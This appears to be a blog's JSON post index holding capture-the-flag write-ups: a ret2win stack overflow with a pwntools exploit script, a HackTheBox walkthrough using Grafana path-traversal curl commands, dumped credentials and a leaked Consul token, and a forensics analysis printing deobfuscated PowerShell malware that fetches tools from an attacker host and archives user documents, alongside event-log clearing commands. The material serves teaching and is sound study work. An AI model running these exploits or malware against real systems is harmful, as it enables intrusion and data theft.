[ { "title": "Ret2win writeup", "url": "/posts/Ret2win/", "categories": "Writeup, RopEmporium", "tags": "ropemporium, pwn", "date": "2023-08-16 15:00:00 +0200", "snippet": "DisclaimerI am in no way a binary exploitation guru. In fact, I only very recently started doing binary exploitation. Therefore, if you find any incorrect information or errors, please feel free to point them out and I will do my best to fix them. This post is intended to serve as notes, as well as a basic introduction to newbies.SummaryThis is the first challenge from Ropemporium. It focuses on one of the more simple stack based overflow attacks. In this case, we are only interested in overwriting the return address stored on the stack, so that we can jump to a restricted function, which we shouldn’t be able to enter under normal circumstances. However, this attack forms the foundation for more advanced attacks, as we will use the ability to overwrite the return address in later challenges to completely change the behaviour of the target program by injecting a “Rop-Chain” into program memory. This writeup will focus on the 64-bit version of the challenge.BasicsIn this section I will briefly go over some of the basic knowledge needed to successfully complete this challenge. Note that everything here relates to the x86-64 cpu architecture on a linux system.For our purpose, the main differences between 32- and 64-bit binaries that we have to be aware of, is that in 32-bit binaries, arguments to functions are passed via the stack, while in 64-bit arguments are passed via registers. The calling convention for 64-bit binaries is RDI, RSI, RDX and so on. This means that the first argument to a function will be stored in the RDI register, the second in the RSI register and so on. When the program runs out of registers however, remaining arguments will be placed on the stack.What is the stack?A stack is a common data structure. It follows the LIFO principle, meaning that the last item added (pushed) to the stack is the first one to be removed (popped). on x86-64, the stack grows downward towards lower memory addresses. This means that whenever you push a new value onto the stack, this value will have an address in memory that is lower than the values stored before it on the stack. Towards the higher addresses you will find environment variables, as well as commandline arguments. When a function is called, a stack frame is inserted onto the stack. At the top of the stack frame you will find the RBP, or the base pointer. The base pointer always points at the base, or the start of the current stack frame. Towards the lower addresses of this stack frame you will find local variables to the function.I’ve placed a figure below to help illustrate the layout of the stack. The image is taken from thegreenplace.net, which I recommend you visit for a more indepth explanation.So, what happens when a function writes to a local variable, but doesn’t check the length of the given user input? Depending on the security mitigations in place, you might be able to overwrite data placed higher on the stack than the local variable you are writing to. This includes other local variables, as well as the RBP and return pointer. More on this later.ToolsI’ll mostly be using the following tools: readelf. GDB with the pwndbg plugin - For dynamic analysis. Ghidra - For static analysis. Pwntools - For exploit automation. ROPgadget - For buidling ropchains / finding gadgets.ExploitationFirst, let’s get a lay of the land using readelf:bitis@Workstation ~/c/r/ret2win&amp;gt; readelf -s ret2winSymbol table &#39;.symtab&#39; contains 69 entries: Num: Value Size Type Bind Vis Ndx Name 0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND 1: 0000000000400238 0 SECTION LOCAL DEFAULT 1 .interp 2: 0000000000400254 0 SECTION LOCAL DEFAULT 2 .note.ABI-tag 3: 0000000000400274 0 SECTION LOCAL DEFAULT 3 .note.gnu.build-id 4: 0000000000400298 0 SECTION LOCAL DEFAULT 4 .gnu.hash 5: 00000000004002c0 0 SECTION LOCAL DEFAULT 5 .dynsym 6: 00000000004003b0 0 SECTION LOCAL DEFAULT 6 .dynstr 7: 0000000000400416 0 SECTION LOCAL DEFAULT 7 .gnu.version 8: 0000000000400430 0 SECTION LOCAL DEFAULT 8 .gnu.version_r 9: 0000000000400450 0 SECTION LOCAL DEFAULT 9 .rela.dyn 10: 0000000000400498 0 SECTION LOCAL DEFAULT 10 .rela.plt 11: 0000000000400528 0 SECTION LOCAL DEFAULT 11 .init 12: 0000000000400540 0 SECTION LOCAL DEFAULT 12 .plt 13: 00000000004005b0 0 SECTION LOCAL DEFAULT 13 .text 14: 00000000004007f4 0 SECTION LOCAL DEFAULT 14 .fini 15: 0000000000400800 0 SECTION LOCAL DEFAULT 15 .rodata 16: 0000000000400958 0 SECTION LOCAL DEFAULT 16 .eh_frame_hdr 17: 00000000004009a8 0 SECTION LOCAL DEFAULT 17 .eh_frame 18: 0000000000600e10 0 SECTION LOCAL DEFAULT 18 .init_array 19: 0000000000600e18 0 SECTION LOCAL DEFAULT 19 .fini_array 20: 0000000000600e20 0 SECTION LOCAL DEFAULT 20 .dynamic 21: 0000000000600ff0 0 SECTION LOCAL DEFAULT 21 .got 22: 0000000000601000 0 SECTION LOCAL DEFAULT 22 .got.plt 23: 0000000000601048 0 SECTION LOCAL DEFAULT 23 .data 24: 0000000000601058 0 SECTION LOCAL DEFAULT 24 .bss---SNIP--- 34: 0000000000000000 0 FILE LOCAL DEFAULT ABS ret2win.c 35: 00000000004006e8 110 FUNC LOCAL DEFAULT 13 pwnme 36: 0000000000400756 27 FUNC LOCAL DEFAULT 13 ret2win---SNIP---In the output, we can see where different data sections are located, as well as the symbol for the functions located in the binary. This can also be done via pwndbg, with the info functions command.pwndbg&amp;gt; inf fuAll defined functions:Non-debugging symbols:0x0000000000400528 _init0x0000000000400550 puts@plt0x0000000000400560 system@plt0x0000000000400570 printf@plt0x0000000000400580 memset@plt0x0000000000400590 read@plt0x00000000004005a0 setvbuf@plt0x00000000004005b0 _start0x00000000004005e0 _dl_relocate_static_pie0x00000000004005f0 deregister_tm_clones0x0000000000400620 register_tm_clones0x0000000000400660 __do_global_dtors_aux0x0000000000400690 frame_dummy0x0000000000400697 main0x00000000004006e8 pwnme0x0000000000400756 ret2win0x0000000000400780 __libc_csu_init0x00000000004007f0 __libc_csu_fini0x00000000004007f4 _finiSometimes, the given binary will be stripped. This means that the binary won’t contain any symbols, and we won’t know the names of the different functions in the binary.Let’s take a look at the disassembled functions. Let’s start with the main function:pwndbg&amp;gt; disass mainDump of assembler code for function main: 0x0000000000400697 &amp;lt;+0&amp;gt;: push rbp 0x0000000000400698 &amp;lt;+1&amp;gt;: mov rbp,rsp 0x000000000040069b &amp;lt;+4&amp;gt;: mov rax,QWORD PTR [rip+0x2009b6] # 0x601058 &amp;lt;stdout@@GLIBC_2.2.5&amp;gt; 0x00000000004006a2 &amp;lt;+11&amp;gt;: mov ecx,0x0 0x00000000004006a7 &amp;lt;+16&amp;gt;: mov edx,0x2 0x00000000004006ac &amp;lt;+21&amp;gt;: mov esi,0x0 0x00000000004006b1 &amp;lt;+26&amp;gt;: mov rdi,rax 0x00000000004006b4 &amp;lt;+29&amp;gt;: call 0x4005a0 &amp;lt;setvbuf@plt&amp;gt; 0x00000000004006b9 &amp;lt;+34&amp;gt;: mov edi,0x400808 0x00000000004006be &amp;lt;+39&amp;gt;: call 0x400550 &amp;lt;puts@plt&amp;gt; 0x00000000004006c3 &amp;lt;+44&amp;gt;: mov edi,0x400820 0x00000000004006c8 &amp;lt;+49&amp;gt;: call 0x400550 &amp;lt;puts@plt&amp;gt; 0x00000000004006cd &amp;lt;+54&amp;gt;: mov eax,0x0 0x00000000004006d2 &amp;lt;+59&amp;gt;: call 0x4006e8 &amp;lt;pwnme&amp;gt; 0x00000000004006d7 &amp;lt;+64&amp;gt;: mov edi,0x400828 0x00000000004006dc &amp;lt;+69&amp;gt;: call 0x400550 &amp;lt;puts@plt&amp;gt; 0x00000000004006e1 &amp;lt;+74&amp;gt;: mov eax,0x0 0x00000000004006e6 &amp;lt;+79&amp;gt;: pop rbp 0x00000000004006e7 &amp;lt;+80&amp;gt;: retEnd of assembler dump.This function calls puts twice, which is used to print 2 strings to stdout, before calling a function named pwnme. Let’s have a look at the pwnme function as well:pwndbg&amp;gt; disass pwnmeDump of assembler code for function pwnme: 0x00000000004006e8 &amp;lt;+0&amp;gt;: push rbp 0x00000000004006e9 &amp;lt;+1&amp;gt;: mov rbp,rsp 0x00000000004006ec &amp;lt;+4&amp;gt;: sub rsp,0x20 0x00000000004006f0 &amp;lt;+8&amp;gt;: lea rax,[rbp-0x20] 0x00000000004006f4 &amp;lt;+12&amp;gt;: mov edx,0x20 0x00000000004006f9 &amp;lt;+17&amp;gt;: mov esi,0x0 0x00000000004006fe &amp;lt;+22&amp;gt;: mov rdi,rax 0x0000000000400701 &amp;lt;+25&amp;gt;: call 0x400580 &amp;lt;memset@plt&amp;gt; 0x0000000000400706 &amp;lt;+30&amp;gt;: mov edi,0x400838 0x000000000040070b &amp;lt;+35&amp;gt;: call 0x400550 &amp;lt;puts@plt&amp;gt; 0x0000000000400710 &amp;lt;+40&amp;gt;: mov edi,0x400898 0x0000000000400715 &amp;lt;+45&amp;gt;: call 0x400550 &amp;lt;puts@plt&amp;gt; 0x000000000040071a &amp;lt;+50&amp;gt;: mov edi,0x4008b8 0x000000000040071f &amp;lt;+55&amp;gt;: call 0x400550 &amp;lt;puts@plt&amp;gt; 0x0000000000400724 &amp;lt;+60&amp;gt;: mov edi,0x400918 0x0000000000400729 &amp;lt;+65&amp;gt;: mov eax,0x0 0x000000000040072e &amp;lt;+70&amp;gt;: call 0x400570 &amp;lt;printf@plt&amp;gt; 0x0000000000400733 &amp;lt;+75&amp;gt;: lea rax,[rbp-0x20] 0x0000000000400737 &amp;lt;+79&amp;gt;: mov edx,0x38 0x000000000040073c &amp;lt;+84&amp;gt;: mov rsi,rax 0x000000000040073f &amp;lt;+87&amp;gt;: mov edi,0x0 0x0000000000400744 &amp;lt;+92&amp;gt;: call 0x400590 &amp;lt;read@plt&amp;gt; 0x0000000000400749 &amp;lt;+97&amp;gt;: mov edi,0x40091b 0x000000000040074e &amp;lt;+102&amp;gt;: call 0x400550 &amp;lt;puts@plt&amp;gt; 0x0000000000400753 &amp;lt;+107&amp;gt;: nop 0x0000000000400754 &amp;lt;+108&amp;gt;: leave 0x0000000000400755 &amp;lt;+109&amp;gt;: retEnd of assembler dump.So there’s quite a bit going on in this function, but just like when trying to break any other program, whether that be a web application or something else, we are looking for where the program handles user input. At +92 there’s a call to read. Right before this call the program moves 0x38 into EDX, RAX into RSI and 0x0 into EDI. The content of RAX is the address callculated via the address stored in RBP minus 0x20.So what does read() do? Based on its manpage, it “attempts to read up to count bytes from file descriptor fd into the buffer starting at buf.” The function definition is as follows:ssize_t read(int fd, void buf[.count], size_t count);Based on the x86-64 calling convention, we know that the first argument passed to read() is stored in the RDI register, which contains 0, otherwise known as the file descriptor for stdin. The buffer argument is stored RSI, and contains the address calculated by the lea instruction at +75, and the amount of bytes is stored in RDX and is equal to 0x38 (56 bytes).So what’s the problem in this program? Well, the problem stems from the address we are writing to. We are writing 0x38 bytes to an address located at RBP-0x20. As discussed earlier, the stack frame layout stores RBP right below the RSP, or the return pointer, and since we are writing 0x38 bytes into an area of memory only 0x20 bytes below RBP, we will be able to overwrite both RBP and RSP. Below is a simple illustration of the stack layout.Higher addesses|--------------------|| RSP ||--------------------|| RBP | addr of RSP - 0x8|--------------------|| vuln buffer | addr of RBP - 0x20|--------------------|lower addressesSince we can control RSP, we can jump to arbitrary places in memory. If the NX (No eXecute) bit on this binary wasn’t set, we might be able to inject shellcode into the process memory, and then jump to it which we could use to spawn a shell and so on. Instead, since the NX bit is set, we will have to make do with functions and so-called gadgets already present in the binary.One function of interest is the ret2win function:pwndbg&amp;gt; disass ret2winDump of assembler code for function ret2win: 0x0000000000400756 &amp;lt;+0&amp;gt;: push rbp 0x0000000000400757 &amp;lt;+1&amp;gt;: mov rbp,rsp 0x000000000040075a &amp;lt;+4&amp;gt;: mov edi,0x400926 0x000000000040075f &amp;lt;+9&amp;gt;: call 0x400550 &amp;lt;puts@plt&amp;gt; 0x0000000000400764 &amp;lt;+14&amp;gt;: mov edi,0x400943 0x0000000000400769 &amp;lt;+19&amp;gt;: call 0x400560 &amp;lt;system@plt&amp;gt; 0x000000000040076e &amp;lt;+24&amp;gt;: nop 0x000000000040076f &amp;lt;+25&amp;gt;: pop rbp 0x0000000000400770 &amp;lt;+26&amp;gt;: retEnd of assembler dump.pwndbg&amp;gt; x/x 0x4009430x400943: 0x6e69622fpwndbg&amp;gt; x/s 0x4009430x400943: &quot;/bin/cat flag.txt&quot;This function calls system and uses it to execute the command /bin/cat flag.txt.The next step is to figure out how many bytes we need to give the program before we start overwriting the return pointer. One way to do this is to calculate it. We have a buffer of 0x20 bytes before we start overwriting the RBP, which holds 8 bytes, and then we begin to overwrite the rsp. As such, we can write 0x28, or 40 bytes before the program will start to complain and segfault. Another way to figure this out is to write an increasing number of A’s until the program crashes. You can also use the cyclic pattern feature in pwndbg to find the offset needed.Below is an abridged pwndbg interaction detialing how to use the cyclic pattern feature.pwndbg&amp;gt; cyclic 128aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaapwndbg&amp;gt; ni &amp;lt;---- run the read() syscallaaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaa &amp;lt;----- Give input to program*RSP 0x7fffffffdd28 ◂— 0x6161616161616166 (&#39;faaaaaaa&#39;) &amp;lt;---- at the ret instruction, pwndbg tells us that the value stored in RSP is 0x6161616161616166pwndbg&amp;gt; cyclic -l 0x6161616161616166Finding cyclic pattern of 8 bytes: b&#39;faaaaaaa&#39; (hex: 0x6661616161616161)Found at offset 40We now know how many bytes to write before overwriting the return address. The next step is to overwrite the return address with the address of the start of the ret2win function. This address can be found either via pwndbg via the disass command as seen previously, or via the readelf command:bitis@Workstation ~/c/r/ret2win&amp;gt; readelf -a ret2win | grep ret2win 34: 0000000000000000 0 FILE LOCAL DEFAULT ABS ret2win.c 36: 0000000000400756 27 FUNC LOCAL DEFAULT 13 ret2winWhile we could write our exploit string into a file and then copy and paste our exploit during program execution, it is much easier and faster to use pwntools. Below is an example of a python script using pwntools that exploits the ret2win binary.from pwn import *elf = ELF(&#39;./ret2win&#39;)&quot;&quot;&quot;Since PIE is disabled, we can find the address of the function ret2win() by using readelf: 36: 0000000000400756 27 FUNC LOCAL DEFAULT 13 ret2win However we can also do it using pwntools, since symbols are not stripped:&quot;&quot;&quot;ret2win_addr = elf.symbols[&#39;ret2win&#39;]print(&quot;ret2win() address: &quot; + hex(ret2win_addr))ret_gadget = p64(0x000000000040053e)# Spawn process, wait until it asks for inputp = elf.process()p.recvuntil(b&#39;&amp;gt; &#39;)p.sendline(b&#39;A&#39; * 40 + ret_gadget + p64(ret2win_addr))p.interactive()Now hold on, what is this ret_gadget in the script? Why is it used? I would recommend that you read the common pitfalls section of ropemporium, but in short the stack needs to be 16-byte aligned for x86-64 binaries before calling GLIBC functions. One way to accomplish this is to pad our exploit string with a ret gadget before returning into a function.ROPgadget can be used to find this ret instruction:(ROPgadget)&amp;gt; binary ret2win[+] Binary loaded(ROPgadget)&amp;gt; load[+] Loading gadgets, please wait...[+] Gadgets loaded !(ROPgadget)&amp;gt; search ret---SNIP---0x000000000040053e : ret---SNIP---Now, if we run the script we should print the flag:bitis@Workstation ~/c/r/ret2win&amp;gt; python win.py[*] &#39;/home/bitis/ctf/ropemporium/ret2win/ret2win&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)ret2win() address: 0x400756[+] Starting local process &#39;/home/bitis/ctf/ropemporium/ret2win/ret2win&#39;: pid 3960[*] Switching to interactive modeThank you!Well done! Here&#39;s your flag:ROPE{a_placeholder_32byte_flag!}[*] Process &#39;/home/bitis/ctf/ropemporium/ret2win/ret2win&#39; stopped with exit code 0 (pid 3960)[*] Got EOF while reading in interactiveAnd we just solved our first pwn challenge! If you aren’t that comfortable reading assembly yet, you can also try to use Ghidra, however I won’t get into that in this post. In my next post I’ll go through the “split” challenge from Ropemporium, in which we’ll have to search the binary for useful strings." }, { "title": "Ambassador writeup", "url": "/posts/Ambassador/", "categories": "Writeup, HackTheBox", "tags": "medium-box", "date": "2023-08-16 15:00:00 +0200", "snippet": "SummaryThis box focuses on primarily on enumeration, as well as finding publically available exploits. First, a publicly known exploit in Grafana to achieve arbitrary file read. This must then be leveraged into obtaining the Grafana sqlite database, which in turn contains credentials for a publicly available mysql service. It is then possible to find ssh credentials for a low privileged user on the box via the mysql service. Finally, by enumerating a git repository it is possible to locate a token for a consul application. This, combined with a public exploit for consul can then be used to escalate privileges.FootholdAs usual, let’s start out by doing an nmap scan.Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-04 00:42 CETNmap scan report for 10.129.228.56Host is up (0.021s latency).Not shown: 65531 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))3000/tcp open ppp?3306/tcp open mysql MySQL 8.0.30-0ubuntu0.20.04.2Interestingly, the box has port 3306 open. As such, let’s keep an eye out for any potential database credentials.The host is also hosting services on port 22, 80 and 3000. Visiting the site on port 80, we learn there is a user named developer with ssh access. Port 3000 is hosting a Grafana instance, which prompts us to login when trying to access it. Searching for vulnerabilities in Grafana reveals the following exploit, which should give us arbitrary file read. Using the below command, it’s possible to enumerate the files on the remote server:curl --path-as-is &quot;http://10.129.228.56:3000/public/plugins/alertlist/../../../../../../../../etc/passwd&quot;root:x:0:0:root:/root:/bin/bash---SNIP---developer:x:1000:1000:developer:/home/developer:/bin/bashlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/falsegrafana:x:113:118::/usr/share/grafana:/bin/falsemysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/falseconsul:x:997:997::/home/consul:/bin/falseAs noted previously, the developer account is indeed present on the box.One can use this vulnerability, paired with this article to find the password for the Grafana admin user:bitis@Workstation ~/h/m/ambassador&amp;gt; curl --path-as-is &quot;http://10.129.228.56:3000/public/plugins/alertlist/../../../../../../../../../../../../../etc/grafana/grafana.ini&quot; | grep password# default admin password, can be changed before first start of grafana, or in profile settingsadmin_password = messageInABottle685427Although this is just the default password that we could have probably found via a google search. In any case it works and we can log in as admin on the Grafana service. We can also use the exploit to download the Grafana database:bitis@Workstation ~/h/m/ambassador [23]&amp;gt; curl --path-as-is &quot;http://10.129.228.56:3000/public/plugins/alertlist/../../../../../../../../../../../../../var/lib/grafana/grafana.db&quot; --output grafana.dbLooking through the database we can tell that the only Grafana user that exists is the admin user.sqlite&amp;gt; .tablesalert login_attemptalert_configuration migration_logalert_instance ngalert_configurationalert_notification orgalert_notification_state org_useralert_rule playlistalert_rule_tag playlist_itemalert_rule_version plugin_settingannotation preferencesannotation_tag quotaapi_key server_lockcache_data sessiondashboard short_urldashboard_acl stardashboard_provisioning tagdashboard_snapshot teamdashboard_tag team_memberdashboard_version temp_userdata_source test_datakv_store userlibrary_element user_authlibrary_element_connection user_auth_tokensqlite&amp;gt; select * from user;1|0|admin|admin@localhost||dad0e56900c3be93ce114804726f78c91e82a0f0f0f6b248da419a0cac6157e02806498f1f784146715caee5bad1506ab069|0X27trve2u|f960YdtaMF||1|1|0||2022-03-13 20:26:45|2022-09-01 22:39:38|0|2023-08-16 14:36:37|0However, the database also contains credentials for the grafana mysql user: grafana:dontStandSoCloseToMe63221!sqlite&amp;gt; select * from data_source;2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2023-08-16 14:18:10|0|{}|1|uKewFgM4zsqlite&amp;gt;By using these credentials to access the mysql service identified on the box earlier, it’s possible to get the password for the developer user in the “whackywidget” database:MySQL [(none)]&amp;gt; show databases;+--------------------+| Database |+--------------------+| grafana || information_schema || mysql || performance_schema || sys || whackywidget |+--------------------+6 rows in set (0,038 sec)MySQL [whackywidget]&amp;gt; show tables;+------------------------+| Tables_in_whackywidget |+------------------------+| users |+------------------------+1 row in set (0,027 sec)MySQL [whackywidget]&amp;gt; select * from users;+-----------+------------------------------------------+| user | pass |+-----------+------------------------------------------+| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |+-----------+------------------------------------------+1 row in set (0,027 sec)MySQL [whackywidget]&amp;gt;The password is base64 encoded, and decodes to anEnglishManInNewYork027468. We can then login to the server via ssh.Privilege escalationAs part of our standard linux enumeration we run pspy64, and get the following output:2022/12/04 01:24:07 CMD: UID=0 PID=1033 | /usr/sbin/cron -f2022/12/04 01:24:07 CMD: UID=0 PID=103 |2022/12/04 01:24:07 CMD: UID=0 PID=1027 | /usr/bin/consul agent -config-dir=/etc/consul.d/config.d -config-file=/etc/consul.d/consul.hcl2022/12/04 01:24:07 CMD: UID=0 PID=102 |2022/12/04 01:24:07 CMD: UID=0 PID=101 |2022/12/04 01:24:07 CMD: UID=0 PID=100 |2022/12/04 01:24:07 CMD: UID=0 PID=10 |2022/12/04 01:24:07 CMD: UID=0 PID=1 | /sbin/init maybe-ubiquity2022/12/04 01:25:01 CMD: UID=0 PID=2291 | /usr/sbin/CRON -f2022/12/04 01:25:01 CMD: UID=0 PID=2293 | /bin/bash /root/cleanup.sh2022/12/04 01:25:01 CMD: UID=0 PID=2292 | /bin/sh -c /root/cleanup.sh2022/12/04 01:25:01 CMD: UID=0 PID=2294 | /bin/bash /root/cleanup.shIt seems that the root user is running a program named consul via a cronjob. We find the below PoC for us to achieve command execution via consul. However it requires a consul token to work. Luckily, if we look at the /opt directory it contains /my-app.This directory contains a git repository.developer@ambassador:/opt/my-app$ ls -altotal 24drwxrwxr-x 5 root root 4096 Mar 13 2022 .drwxr-xr-x 4 root root 4096 Sep 1 2022 ..drwxrwxr-x 4 root root 4096 Mar 13 2022 envdrwxrwxr-x 8 root root 4096 Mar 14 2022 .git-rw-rw-r-- 1 root root 1838 Mar 13 2022 .gitignoredrwxrwxr-x 3 root root 4096 Mar 13 2022 whackywidgetdeveloper@ambassador:/opt/my-app$ git logcommit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -&amp;gt; main)Author: Developer &amp;lt;developer@ambassador.local&amp;gt;Date: Sun Mar 13 23:47:36 2022 +0000 tidy config scriptcommit c982db8eff6f10f8f3a7d802f79f2705e7a21b55Author: Developer &amp;lt;developer@ambassador.local&amp;gt;Date: Sun Mar 13 23:44:45 2022 +0000 config scriptcommit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6Author: Developer &amp;lt;developer@ambassador.local&amp;gt;Date: Sun Mar 13 22:47:01 2022 +0000 created project with django CLIcommit 4b8597b167b2fbf8ec35f992224e612bf28d9e51Author: Developer &amp;lt;developer@ambassador.local&amp;gt;Date: Sun Mar 13 22:44:11 2022 +0000 .gitignoreIf we take a look at the differences between some of the commits, we can find the consul token:developer@ambassador:/opt/my-app$ git diff 33a53 c982dbdiff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.shindex fc51ec0..35c08f6 100755--- a/whackywidget/put-config-in-consul.sh+++ b/whackywidget/put-config-in-consul.sh@@ -1,4 +1,4 @@ # We use Consul for application config in production, this script will help set the correct values for the app-# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running+# Export MYSQL_PASSWORD before running-consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD+consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORDWe can then get a reverse shell by using the PoC and setting up a listener on our own server." }, { "title": "Artifacts of dangerous Sightings writeup", "url": "/posts/Artifacts/", "categories": "Writeup, HackTheBox", "tags": "forensics, windows, powershell", "date": "2023-03-23 14:00:00 +0100", "snippet": "DescriptionPandora has been using her computer to uncover the secrets of the elusive relic. She has been relentlessly scouring through all the reports of its sightings. However, upon returning from a quick coffee break, her heart races as she notices the Windows Event Viewer tab open on the Security log. This is so strange! Immediately taking control of the situation she pulls out the network cable, takes a snapshot of her machine and shuts it down. She is determined to uncover who could be trying to sabotage her research, and the only way to do that is by diving deep down and following all traces …WriteupWe are given a vhdx file, which contains a snapshot of the Windows machine belonging to Pandora. Looking through the snapshot, we find a powershell history file, containing the following:type finpayload &amp;gt; C:\\Windows\\Tasks\\ActiveSyncProvider.dll:hidden.ps1exitGet-WinEventGet-EventLog -Listwevtutil.exe cl &quot;Windows PowerShell&quot; wevtutil.exe cl Microsoft-Windows-PowerShell/OperationalRemove-EventLog -LogName &quot;Windows PowerShell&quot;Remove-EventLog -LogName Microsoft-Windows-PowerShell/OperationalRemove-EventLog We can tell based on this that a payload is echoed into the file given by the path C:\\Windows\\Tasks\\ActiveSyncProvider.dll:hidden.ps1, and then eventlogs are deleted.Wait, what? On the system there is no file named ActiveSyncProvider.dll:hidden.ps1, nor hidden.ps1, so what’s going on here? Turns out, on Windows there is a thing called ADS, or Alternative Data Stream. Basically, it can be used to add meta data to files, however in this case it is used to store a (presumably) malicious payload inside the metadata of ActiveSyncProvider.dll. If we look at recently modified files on the snapshot this file also shows up as the most recently modified, so this makes sense.We can extract the payload by using the powershell command:Get-Content .\\ActiveSyncProvider.dll -Stream hidden.ps1The contents of the file looks like this:powerShell.exe -WindowStyle hiddeN -ExecuTionPolicy ByPasS -enc JAB7AFsAfgBAAH0AIAA9ACAAJAAoACkAOw....As we can tell, the payload runs a base64 encoded string as a powershell script. If we decode this string we end up with a payload that looks like this:${[~@} = $();${!!@!!]} = ++${[~@}; ${[[!} = --${[~@} + ${!!@!!]} + ${!!@!!]}; ${~~~]} = ${[[!} + ${!!@!!]}; ${[!![!} = ${[[!} + ${[[!}; ${(~(!} = ${~~~]} + ${[[!}; ${!~!))} = ${[!![!} + ${[[!}; ${((!} = ${!!@!!]} + ${[!![!} + ${[[!}; ${=!!@!!}  = ${~~~]} - ${!!@!!]} + ${!~!))}; ${!=} =  ${((!} - ${~~~]} + ${!~!))} - ${!!@!!]}; ${=@!~!} = &quot;&quot;.(&quot;$(@{})&quot;[14]+&quot;$(@{})&quot;[16]+&quot;$(@{})&quot;[21]+&quot;$(@{})&quot;[27]+&quot;$?&quot;[1]+&quot;$(@{})&quot;[3]); ${=@!~!} = &quot;$(@{})&quot;[14]+&quot;$?&quot;[3]+&quot;${=@!~!}&quot;[27]; ${@!=} = &quot;[&quot;+&quot;$(@{})&quot;[7]+&quot;$(@{})&quot;[22]+&quot;$(@{})&quot;[20]+&quot;$?&quot;[1]+&quot;]&quot;;&quot;${@!=}${~~~]}${(~(!} + ${@!=}${~~~]}${(~(!} + ${@!=}${~~~]}${(~(!} + ${@!=}${~~~]}${[[!} + ${@!=}${[!![!}${!~!))} + ......&quot; |&amp;amp; ${=@!~!}Obviosuly this looks like a super obfuscated and malicious piece of powershell malware. We can deobfuscate it by opening our powershell terminal, defining the same variables that the script itself defines, and then pasting in the string, without piping it into anything to avoid executing it. Obviously, it this was a real piece of malware we would have to be a little more careful, but since we are on a linux machine anyways it probably won’t be too bad. We then get a slightly more deobfuscated version:[Char]35 + [Char]35 + [Char]35 + [Char]32 + [Char]46 + [Char]32 + [Char]32 + [Char]32 + [Char]32 + [Char]32 + [Char]46 + [Char]32 + [Char]32 + [Char]32 + [Char]32 + [Char]32 + [Char]32 + [Char]32 + [Char]46 + [Char]32 + [Char]32 + [Char]46 + [Char]32 + [Char]32 + [Char]32 + [Char]46 + [Char]32 + [Char]46 + [Char]32 + [Char]32 + [Char]32 + [Char]46 + [Char]32 + [Char]32 + [Char]32 + [Char]46 + [Char]32 + [Char]46 + [Char]32 + [Char]32 + [Char]32 + [Char]32 + [Char]43 + [Char]32 + [Char]32 + ...We can further deobfuscate this quite trivially, by loading this as a string in a python script, replacing all the [Char] blocks with empty strings, and then building the deobfuscated powershell script using the provided char codes. The result of this operation can be seen below:function makePass{ $alph=@(); 65..90|foreach-object{$alph+=[char]$_}; $num=@(); 48..57|foreach-object{$num+=[char]$_}; $res = $num + $alph | Sort-Object {Get-Random}; $res = $res -join &#39;&#39;; return $res;}function makeFileList{ $files = cmd /c where /r $env:USERPROFILE *.pdf *.doc *.docx *.xls *.xlsx *.pptx *.ppt *.txt *.csv *.htm *.html *.php; $List = $files -split &#39;\\r&#39;; return $List;}function compress($Pass){ $tmp = $env:TEMP; $s = &#39;https://relic-reclamation-anonymous.alien:1337/prog/&#39;; $link_7zdll = $s + &#39;7z.dll&#39;; $link_7zexe = $s + &#39;7z.exe&#39;; $7zdll = &#39;&quot;&#39;+$tmp+&#39;\\7z.dll&quot;&#39;; $7zexe = &#39;&quot;&#39;+$tmp+&#39;\\7z.exe&quot;&#39;; cmd /c curl -s -x socks5h://localhost:9050 $link_7zdll -o $7zdll; cmd /c curl -s -x socks5h://localhost:9050 $link_7zexe -o $7zexe; $argExtensions = &#39;*.pdf *.doc *.docx *.xls *.xlsx *.pptx *.ppt *.txt *.csv *.htm *.html *.php&#39;; $argOut = &#39;Desktop\\AllYourRelikResearchHahaha_{0}.zip&#39; -f (Get-Random -Minimum 100000 -Maximum 200000).ToString(); $argPass = &#39;-p&#39; + $Pass; Start-Process -WindowStyle Hidden -Wait -FilePath $tmp&#39;\\7z.exe&#39; -ArgumentList &#39;a&#39;, $argOut, &#39;-r&#39;, $argExtensions, $argPass -ErrorAction Stop;}$Pass = makePass;$fileList = @(makeFileList);$fileResult = makeFileListTable $fileList;compress $Pass;$TopSecretCodeToDisableScript = &quot;HTB{Y0U_C4nt_St0p_Th3_Alli4nc3}&quot;We then receive our flag and have solved the challenge." }, { "title": "DroidComp writeup", "url": "/posts/DroidComp/", "categories": "Writeup, android, APK, reversing, frida", "tags": "android, apk, reversing, frida", "date": "2023-01-22 17:00:00 +0100", "snippet": "SummaryThis challenge focuses on reverse engineering an APK that uses a function with a vulnerable webView object. We can use this object and the JavascriptInterface bound to it to execute one specific function, which just so happens to return the flag.IntroductionWe are given an .apk file and the challenge description: “Here is the APK file. Get the flag by exploiting the vulnerabilities.”Overall, not a lot to go off of. We start out by decoding the given APK and taking a look at the AndroidManifest.xml file:&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; standalone=&quot;no&quot;?&amp;gt;&amp;lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:compileSdkVersion=&quot;32&quot; 